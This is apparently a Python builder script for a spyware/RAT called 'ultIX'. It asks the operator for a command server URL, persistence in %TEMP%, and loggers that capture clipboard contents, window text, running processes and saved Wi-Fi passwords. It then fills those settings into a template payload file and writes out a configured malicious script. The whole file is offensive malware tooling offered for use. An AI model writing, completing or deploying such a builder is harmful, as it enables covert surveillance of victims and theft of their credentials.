from termcolor import colored
import platform as osUsing
import sys

class Builder:
    def __init__(self):
        import os
        os.system("cls||clear")
        print(f"""
      .__   __  ._______  ____
 __ __|  |_/  |_|   \   \/   /
|  |  \  |\   __\   |\      / 
|  |  /  |_|  | |   |/      \ 
|____/|____/__| |___/___/\___\ \n
    Created by RealDutch7\n""")
        self.url = self.serverURL()
        self.log = self.InfoLog()
        self.persist = self.persist()
        self.outPutname = self.name()
        self.build()
#         self.openFile(self.outPutname, self.getPlatform, self.url)

#         print(f"""
# Name: {self.outPutname}
# Format: {self.getPlatform}
# URL: {self.url}
#         """)
        # if self.getPlatform == "p":
        #     self.pythonFormat()
        # else:
        #     pass

    # def data(self):
    #     self.webURL = input("[ServerURL] >> ")

    def serverURL(self):
        print("=--= URL =--=")

        self.url = input("[Server URL] >> ")
        if self.url == "":
            sys.exit()

        return self.url

    def persist(self):
        self.persist_enable = ""
        self.persist_dir = ""
        print("\n=--= Peristance Options =--=")
        persist = input("\n[Persistance] after opening the file enable persistance? (y/n) >> ")
        if persist == "y":
            self.persist_enable = "True"
            print("[Persitance] will by default installed in %TEMP%")
            self.persist_dir = input("[Persistance Dir] Folder for the file to be stored (leave empty for 'Persist' folder) >> ")
            
        if self.persist_dir == "":
            print("Empty")
            self.persist_dir = "Persist"
        self.persistDir = self.persist_dir



    def InfoLog(self):
        self.contents = ""
        print("\n=--= Logger Options =--=")
        enable = input("[Logger] Do you want to enable logger? (y/n) >> ")
        if enable == "n":
            self.contents = "noLogger"
            self.timebetween = "False"
        elif enable == "y":
            self.timebetween = input("[Logger interval in seconds] must be more than 3 >> ")
            if int(self.timebetween) > 3:
                self.timebetween = int(self.timebetween)
            else:
                print("[Logger] Not a valid time has be set. Setted Interval to 3")
                self.timebetween = 3
            print(f"""\n=--= Loggers Available =--=
[Clipboard] --- Logs Clipboard contents every {self.timebetween} seconds
[ActivText] --- logs Window text every {self.timebetween} seconds
[ActivProc] --- Logs Active Processes every {self.timebetween} seconds
[WifiPassw] --- Logs Wifi Passwords every {self.timebetween} seconds
""")
            self.clip = input("[Clipboard] --- log clipboard? (y/n) >> ")
            if self.clip == "y":
                self.contents += "Clipboard"

            self.activText = input("[ActivText] --- log Window text? (y/n) >> ")
            if self.activText == "y":
                self.contents += "TextLog"
            
            self.ActiveProc = input("[ActivProc] --- log active processes? (y/n) >> ")
            if self.ActiveProc == "y":
                self.contents += "ActiveProcesses"

            self.WifiPW = input("[WifiPassw] --- log wifipassword? (y/n) >> ")
            if self.WifiPW == "y":
                self.contents += "WifiPasswords"
        else:
            print("[-] Invalid input! \n")
            sys.exit()

    def build(self):
        # if self.getPlatform == "e":
        #     self.getPlatform = "Windows Exe"
        # else:
        #     self.getPlatform = "Python"
        
        if self.log != "noLogger":
            self.log = "Enabled"
        else:
            self.log = "Disabled"
        
        self.logger = ""
        self.persistContent = ""
        self.persistContentFolder = ""
        self.persistPath = ""
        self.contentsLogger = str(self.contents)
       
        if "Clipboard" in self.contentsLogger:
            self.logger += "[Logger] Clipboard"
        if "TextLog" in self.contentsLogger:
            self.logger += "\n[Logger] WindowText"
        if "ActiveProcesses" in self.contentsLogger:
            self.logger += "\n[Logger] Active Processes"
        if "WifiPasswords" in self.contentsLogger:
            self.logger += "\n[Logger] Wifi Passwords"
        
        if self.persist_enable =="True":
            self.persist_enable = "Enabled"
            self.persistPath += f"{self.persistContentFolder}\{self.outPutname}"
        else:
            self.persist_enable = "Disabled"
            self.persistPath += "Disabled"

        if self.logger == "":
            self.logger = "No Loggers Active"

        
        print(f"""
=--= Build Information =--=         

Server URL: {self.url}

File Name: {self.outPutname}

Persistance: {self.persist_enable}
=--= Persistance Options =--=
[Persistance] Full Path: {self.persistPath}

Logger: {self.log}
=--= Loggers Active =--=
{self.logger}

        """)
        ask = input("[?] a Are you sure you want to build your program? (y/n) >> ")

        if ask == "y":
            self.openFile(self.outPutname, self.url, self.logger)

    def openFile(self, filename, serverURL, logs):

        print(f"""
Filename: {filename}
ServerURL: {serverURL}
Logs: {logs}
        
        
        """)
        if not filename.endswith(".py"):
            filename = f"{filename}.py"
        import os
        print(os.getcwd() + "\n")
        print(logs)
        # self.logContents = ""

        # if "Clipboard" in logs:
        #     self.
        # if "WindowText" in logs:
        #     self.logContents += "\n        self.windowText()"
        # if "Processes" in logs:
        #     self.logContents += "\n        self.allProc()"
        # if "Wifi Passwords" in logs:
        #     self.logContents += "\n        self.WifiPasswords()"

        # print(self.logContents)

        self.path_core = "Core/script.py"
        self.path_script = f"Data/{filename}"

        with open(self.path_core,  "r+") as f:
            file_contents = f.read()
        
        with open(self.path_script, "w+") as final:
            contents = file_contents.replace("CommandServerLink", f'"{serverURL}"')
            if self.timebetween != "":
                contents = contents.replace("intForTime", f"{self.timebetween}")
            else:
                contents = contents.replace("intForTime", "False")
            if "Clipboard" in logs:
                contents = contents.replace("loggerClipboard", "True")
            else:
                contents = contents.replace("loggerClipboard", "False")

            if "Processes" in logs:
                contents = contents.replace("loggerProcesses", "True")
            else:
                contents = contents.replace("loggerProcesses", "False")

            if "WindowText" in logs:
                contents = contents.replace("loggerWindow", "True")
            else:
                contents = contents.replace("loggerWindow", "False")

            if "Wifi" in logs:
                contents = contents.replace("loggerWifiPasswords", "True")
            else:
                contents = contents.replace("loggerWifiPasswords", "False")

            if self.persist_enable == "Enabled":
                contents = contents.replace("persistTrueorFalse", "True")
            else:
                contents = contents.replace("persistTrueorFalse", "False")
            if self.persist_enable != "":
                contents = contents.replace("persistFolder", f'"{self.persist_dir}"')
            
            final.write(contents)
            final.close()

        print("Done")

    def name(self):
        self.Askname = input("\n[File Name] >> ")
        if not self.Askname.endswith(".py"):
            self.Askname = f"{self.Askname}.py"
        return self.Askname
            


def main():
    Builder()

if __name__ == "__main__":
    main()